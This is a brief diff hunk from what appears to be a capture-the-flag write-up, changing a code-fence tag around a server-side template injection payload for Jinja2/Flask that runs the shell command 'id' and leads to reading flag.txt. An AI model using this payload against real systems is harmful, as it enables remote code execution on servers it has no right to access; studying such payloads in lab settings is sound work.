@@ -36,7 +36,7 @@ Boom! template rendering applied.
 
 Let's jump in to try out RCE payloads. 
 
-```bash
+```
 GET /{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
 We get the flag.txt 
